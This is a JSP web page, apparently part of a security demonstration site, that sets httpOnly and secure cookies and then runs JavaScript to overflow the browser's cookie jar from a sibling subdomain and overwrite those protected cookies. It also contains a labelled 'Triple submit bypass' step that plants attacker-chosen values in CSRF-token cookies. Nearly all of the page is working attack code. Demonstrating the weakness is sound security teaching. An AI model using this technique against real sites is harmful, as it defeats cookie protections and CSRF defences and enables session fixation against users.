<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
         pageEncoding="utf-8"%>

<% response.addHeader("Set-Cookie", "httpOnlyCookie=untouchable;Path=/;Domain=.1-liner.org;httpOnly");%>
<% response.addHeader("Set-Cookie", "secureCookie=untouchable;Path=/;Domain=.1-liner.org;secure");%>
<% response.addHeader("Set-Cookie", "httpOnlyAndSecureCookie=untouchable;Path=/;Domain=.1-liner.org;httpOnly;secure");%>

<!DOCTYPE html>
<html>
<head>
    <base href="https://other.1-liner.org:8444/" />
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">

    <title>Other Subdomain</title>

    <script src="../js/jquery-1.7.2.min.js"></script>
    <script src="../js/jquery.cookie.js"></script>
    <script>
        var overflowCookieJar = function() {
                    var name = "marker", val = "markerVal", counter = 0;
                    $.cookie(name, val, {path: "/", domain: ".1-liner.org"});
                    while($.cookie(name) == val) {
                        $.cookie(name + counter++, val, {path: "/", domain: ".1-liner.org"});
                    }
                    return counter;
                },
                overwriteCookie = function(knownName, overwriteValue) {
                    $.cookie(knownName, overwriteValue, {path: "/", domain: ".1-liner.org"});
                },
                isCookieOverwritten = function(knownName, overwriteValue) {
                    return $.cookie(knownName) === overwriteValue;
                },
                outputHttpOnlyCookieOverwriteResult = function(knownName, overwriteValue) {
                    $("#httpOnlyOutput").text("The httpOnly cookie was " + (isCookieOverwritten(knownName, overwriteValue)? "" : "not ") + "overwritten.");
                },
                outputSecureCookieOverwriteResult = function(knownName, overwriteValue) {
                    $("#secureOutput").text("The secure cookie was " + (isCookieOverwritten(knownName, overwriteValue)? "" : "not ") + "overwritten.");
                },
                outputHttpOnlyAndSecureCookieOverwriteResult = function(knownName, overwriteValue) {
                    $("#httpOnlyAndSecureOutput").text("The httpOnly+secure cookie was " + (isCookieOverwritten(knownName, overwriteValue)? "" : "not ") + "overwritten.");
                };

        $(document).ready(function() {
            var overwriteValue = "overwritten", knownHttpOnlyName = "httpOnlyCookie", knownSecureName = "secureCookie", knownHttpOnlyAndSecureName = "httpOnlyAndSecureCookie";
            $("#cookieJarOverflowButton").click(function(event) {
                var count = -1,
                        nickNameSecurish = $.cookie("nickNameSecurish"),
                        nickNameVulnerable = $.cookie("nickNameVulnerable");
                $("#cookieJarOutput").text("Running ...");
                count = overflowCookieJar();  // Timeout needed because cookie write loop freezes render thread
                $("#cookieJarOutput").text("It took " + count + " cookies to overflow the jar. ");
                overwriteCookie(knownHttpOnlyName, overwriteValue);
                overwriteCookie(knownSecureName, overwriteValue);
                overwriteCookie(knownHttpOnlyAndSecureName, overwriteValue);
                outputHttpOnlyCookieOverwriteResult(knownHttpOnlyName, overwriteValue);
                outputSecureCookieOverwriteResult(knownSecureName, overwriteValue);
                outputHttpOnlyAndSecureCookieOverwriteResult(knownHttpOnlyAndSecureName, overwriteValue);
                // Triple submit bypass
                overwriteCookie("0987654321abcdef", "0987654321abcdef");
                overwriteCookie("nickNameSecurish", nickNameSecurish);
                overwriteCookie("nickNameVulnerable", nickNameVulnerable);
            });
            $("#httpOnlyWipeButton").click(function(event) {
                overwriteCookie(knownHttpOnlyName, overwriteValue);
                outputHttpOnlyCookieOverwriteResult(knownHttpOnlyName, overwriteValue);
            });
            $("#secureWipeButton").click(function(event) {
                overwriteCookie(knownSecureName, overwriteValue);
                outputSecureCookieOverwriteResult(knownSecureName, overwriteValue);
            });
            $("#httpOnlyAndSecureWipeButton").click(function(event) {
                overwriteCookie(knownHttpOnlyAndSecureName, overwriteValue);
                outputHttpOnlyAndSecureCookieOverwriteResult(knownHttpOnlyAndSecureName, overwriteValue);
            });
        });
    </script>

</head>
<body>
<button id="httpOnlyWipeButton">Try overwriting httpOnly cookie</button><br>
<button id="secureWipeButton">Try overwriting secure cookie</button><br>
<button id="httpOnlyAndSecureWipeButton">Try overwriting httpOnly+secure cookie</button><br>
<button id="cookieJarOverflowButton">Start overflowing cookie jar</button><br>

<div id="cookieJarOutput"></div>
<div id="httpOnlyOutput"></div>
<div id="secureOutput"></div>
<div id="httpOnlyAndSecureOutput"></div>

</body>
</html>